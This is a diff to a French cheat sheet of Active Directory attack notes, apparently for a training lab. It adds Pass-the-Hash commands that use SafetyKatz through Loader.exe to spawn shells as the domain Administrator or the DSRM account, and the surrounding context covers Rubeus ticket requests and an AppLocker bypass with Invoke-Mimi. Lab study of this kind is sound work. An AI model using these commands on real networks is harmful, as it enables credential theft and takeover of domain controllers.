@@ -36,6 +36,21 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 
 Toute commande lancée dans le process spawné (`winrs`, `xcopy`) s'exécute avec les privilèges de `svcadmin`.
 
+### Pass-the-Hash (rejouer un NTLM sans passer par Kerberos)
+
+> Utile quand OverPass-the-Hash n'est pas applicable : compte **local** (DSRM sur le DC, flag F20), ou validation directe du hash Administrator de domaine (flag F17) sans forger de ticket.
+
+```powershell
+# Domaine (F17) — spawner un process sous l'identité du DA
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NTLM> /run:powershell.exe" "exit"
+
+# DSRM (F20) — compte LOCAL du DC, pas de domaine AD
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /domain:<DC_MACHINE_NAME> /user:Administrator /ntlm:<DSRM_NTLM> /run:powershell.exe" "exit"
+
+# depuis le shell qui s'ouvre :
+dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
+```
+
 ### Bypass AppLocker avec Invoke-MimiEx
 
 Quand `Loader.exe` est bloqué par AppLocker sur la cible mais que le dot-sourcing `.ps1` reste autorisé : copier `Invoke-Mimi.ps1`, y coller l'appel de fonction directement dans le script (`Invoke-Mimi -Command '"sekurlsa::ekeys"'`), le transférer et l'exécuter par dot-source sur l'hôte cible plutôt que de lancer un binaire.
